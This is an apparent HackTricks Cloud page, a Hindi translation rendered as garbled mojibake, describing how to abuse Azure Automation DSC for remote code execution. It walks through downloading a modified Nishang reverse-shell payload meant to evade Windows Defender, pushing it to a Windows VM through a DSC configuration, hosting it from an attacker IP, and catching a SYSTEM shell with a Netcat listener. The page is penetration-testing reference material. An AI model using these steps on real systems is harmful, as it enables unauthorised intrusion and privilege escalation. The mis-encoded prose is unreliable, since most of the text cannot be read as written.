# Az - рд░рд╛рдЬреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди RCE

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> рдХреЗ рд╕рд╛рде рдЬреАрд░реЛ рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ!</summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [SUBSCRIPTION PLANS](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [NFTs](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣, The PEASS Family, рдЦреЛрдЬреЗрдВ
* **Join the** ЁЯТм [Discord group](https://discord.gg/hRep4RUj7f) рдпрд╛ [telegram group](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **Twitter** рдкрд░ рдлрд╝реЙрд▓реЛ рдХрд░реЗрдВ ЁЯРж [@hacktricks_live](https://twitter.com/hacktricks_live)ред
* **HackTricks** рдФрд░ **HackTricks Cloud** github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

**рдкреВрд░реА рдкреЛрд╕реНрдЯ рджреЗрдЦреЗрдВ: [https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe)**

### рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ (C2) рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рддреИрдпрд╛рд░реА рдФрд░ рдЪрд░рдгреЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

#### рдЕрд╡рд▓реЛрдХрди
рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рд╕реЗрдЯрдЕрдк рдХрд░рдиреЗ рдХреА рд╢рд╛рдорд┐рд▓рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд Nishang `Invoke-PowerShellTcp.ps1` рдкреЗрд▓реЛрдб, рдЬрд┐рд╕реЗ `RevPS.ps1` рдирд╛рдо рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣реЛрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд┐рдВрдбреЛрдЬ рдбрд┐рдлреЗрдВрдбрд░ рдХреЛ рдЫрд▓рдирд╛ рдХрд░ рд╕рдХреЗред рдкреЗрд▓реЛрдб рдХреЛ рдПрдХ Kali Linux рдорд╢реАрди рд╕реЗ IP `40.84.7.74` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рд╕рд░рд▓ Python HTTP рд╕рд░реНрд╡рд░ рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдСрдкрд░реЗрд╢рди рдХрдИ рдЪрд░рдгреЛрдВ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ:

#### рдЪрд░рдг 1 тАФ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдПрдВ
- **рдЖрд╡рд╢реНрдпрдХ рдлрд╝рд╛рдЗрд▓реЗрдВ:** рджреЛ PowerShell рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ:
1. `reverse_shell_config.ps1`: рдПрдХ рдЗрдЪреНрдЫрд┐рдд рд╕реНрдерд┐рддрд┐ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди (DSC) рдлрд╝рд╛рдЗрд▓ рдЬреЛ рдкреЗрд▓реЛрдб рдХреЛ рд▓рд╛рддреА рд╣реИ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреА рд╣реИред рдпрд╣ [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse_shell_config.ps1) рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИред
2. `push_reverse_shell_config.ps1`: рдПрдХ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рд╡реАрдПрдо рдкрд░ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, [GitHub](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push_reverse_shell_config.ps1) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИред
- **рдХрд╕реНрдЯрдорд╛рдЗрдЬрд╝реЗрд╢рди:** рдЗрди рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рдЪрд░рдгреЛрдВ рдФрд░ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдЕрдиреБрдХреВрд▓рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рд╕рдВрд╕рд╛рдзрди рдирд╛рдо, рдлрд╝рд╛рдЗрд▓ рдкрде, рдФрд░ рд╕рд░реНрд╡рд░/рдкреЗрд▓реЛрдб рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд╕рдорд╛рд╡рд┐рд╖реНрдЯ рдХрд░рдирд╛ред

#### рдЪрд░рдг 2 тАФ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЬрд╝рд┐рдк рдХрд░реЗрдВ
- `reverse_shell_config.ps1` рдХреЛ `.zip` рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдХреБрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдпрд╣ рддреИрдпрд╛рд░ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рдЕрдЬрд╝реНрдпреВрд░ рд╕реНрдЯреЛрд░реЗрдЬ рдЕрдХрд╛рдЙрдВрдЯ рдореЗрдВ рд╕реНрдерд╛рдирд╛рдВрддрд░рдг рдХреЗ рд▓рд┐рдПред
```powershell
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
#### рдЪрд░рдг 3 тАФ рд╕рдВрдЧреНрд░рд╣ рд╕рдВрджрд░реНрдн рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ
- рдЬрд╝рд┐рдк рдХреА рдЧрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ Azure рдХреЗ Set-AzStorageBlobContent cmdlet рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреВрд░реНрд╡рдирд┐рд░реНрдзрд╛рд░рд┐рдд Azure рд╕реНрдЯреЛрд░реЗрдЬ рдХрдВрдЯреЗрдирд░, azure-pentest рдореЗрдВ рдЕрдкрд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
```powershell
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
#### рдЪрд░рдг 4 тАФ рдХрд╛рд▓реА рдмреЙрдХреНрд╕ рдХреА рддреИрдпрд╛рд░реА
- рдХрд╛рд▓реА рд╕рд░реНрд╡рд░ рдПрдХ GitHub рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ RevPS.ps1 рдкреЗрд▓реЛрдб рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рддрд╛ рд╣реИред
```bash
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
#### рдХрджрдо 5 тАФ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ
- рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╡рд┐рдВрдбреЛрдЬ VM рдкрд░ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рдкрд░ рд░рд┐рд╡рд░реНрд╕-рд╢реИрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдбрд┐рдкреНрд▓реЙрдп рд╣реЛрддрд╛ рд╣реИред

#### рдХрджрдо 6 тАФ рдкреЗрд▓реЛрдб рд╣реЛрд╕реНрдЯ рдХрд░реЗрдВ рдФрд░ рд▓рд┐рд╕реНрдЯрдирд░ рд╕реЗрдЯрдЕрдк рдХрд░реЗрдВ
- рдПрдХ Python SimpleHTTPServer рд╢реБрд░реВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкреЗрд▓реЛрдб рд╣реЛрд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╕рд╛рде рд╣реА рдПрдХ Netcat рд▓рд┐рд╕реНрдЯрдирд░ рднреА рд╕реЗрдЯрдЕрдк рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдиреЗ рд╡рд╛рд▓реА рдХрдиреЗрдХреНрд╢рдиреНрд╕ рдХреЛ рдХреИрдкреНрдЪрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```bash
sudo python -m SimpleHTTPServer 80
sudo nc -nlvp 443
```
- рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдп рджреНрд╡рд╛рд░рд╛ рдкреЗрд▓реЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╕рд┐рд╕реНрдЯрдо рд╕реНрддрд░ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред

#### рдирд┐рд╖реНрдХрд░реНрд╖

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд╕рдлрд▓ рдирд┐рд╖реНрдкрд╛рджрди рд╕реЗ рдЖрдЧреЗ рдХрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдЦреБрд▓рддреА рд╣реИрдВ, рдЬреИрд╕реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдбрдВрдкрд┐рдВрдЧ рдпрд╛ рд╣рдорд▓реЗ рдХреЛ рдХрдИ рд╡реАрдПрдо рдкрд░ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд░рдирд╛ред рдпрд╣ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдЖрдЧреЗ рдХреА рд╢рд┐рдХреНрд╖рд╛ рдФрд░ рд░рдЪрдирд╛рддреНрдордХрддрд╛ рдХреЛ рдкреНрд░реЛрддреНрд╕рд╛рд╣рд┐рдд рдХрд░рддреА рд╣реИ рдЖрдЬрд╝реНрдпреВрд░ рдСрдЯреЛрдореЗрд╢рди рдбреАрдПрд╕рд╕реА рдореЗрдВред

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХрд╛ рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks_live**](https://twitter.com/hacktricks_live)** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
